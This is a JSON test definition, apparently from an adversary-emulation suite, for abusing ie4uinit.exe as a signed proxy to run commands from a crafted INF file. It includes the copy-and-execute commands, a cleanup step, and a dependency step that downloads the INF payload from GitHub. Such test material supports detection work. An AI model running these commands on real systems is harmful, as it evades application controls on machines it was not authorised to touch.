{
  "id": "13c0804e-615e-43ad-b223-2dfbacd0b0b3",
  "name": "Lolbas ie4uinit.exe use as proxy",
  "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "815ffb84-b239-49e9-bc93-27bf7530857c",
      "type": "execute-command",
      "data": {
        "command": "copy #{Path_ie4uinit} %TEMP%\\ie4uinit.exe\ncopy \"#{Path_inf}\" %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "2afd9bc0-e2d1-44da-ad2e-d67310d515ae",
      "type": "execute-command",
      "data": {
        "command": "del %TEMP%\\ie4uinit.exe \u003enul 2\u003e\u00261\ndel %TEMP%\\ieuinit.inf \u003enul 2\u003e\u00261\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "7d7a4120-1fe3-4326-9b1d-2664b2f87119",
      "name": "Check dependency 1/1",
      "description": "ieuinit.inf must exist on disk at specified location (#{Path_inf})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{Path_inf}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "9126f49d-e59c-489d-99d2-946b31d4844f",
      "name": "Resolve dependency 1/1",
      "description": "ieuinit.inf must exist on disk at specified location (#{Path_inf})\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{Path_inf}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf\" -OutFile \"#{Path_inf}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "6f6f4a80-38c1-430d-bcc4-6ba1591d8270",
      "name": "Re-check dependency 1/1",
      "description": "ieuinit.inf must exist on disk at specified location (#{Path_inf})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{Path_inf}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "815ffb84-b239-49e9-bc93-27bf7530857c",
      "p": "on-success",
      "o": "2afd9bc0-e2d1-44da-ad2e-d67310d515ae"
